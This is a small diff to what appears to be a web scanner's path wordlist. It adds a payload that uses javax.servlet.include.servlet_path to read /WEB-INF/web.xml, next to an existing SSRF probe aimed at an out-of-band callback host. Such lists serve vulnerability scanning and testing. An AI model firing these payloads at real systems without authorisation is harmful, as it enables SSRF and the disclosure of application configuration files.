@@ -127,3 +127,4 @@
 /user/login
 /_image?href=//{{interactsh-url}}/600x400
 /login_ok.htm
+/{{path}}?javax.servlet.include.servlet_path=/WEB-INF/web.xml
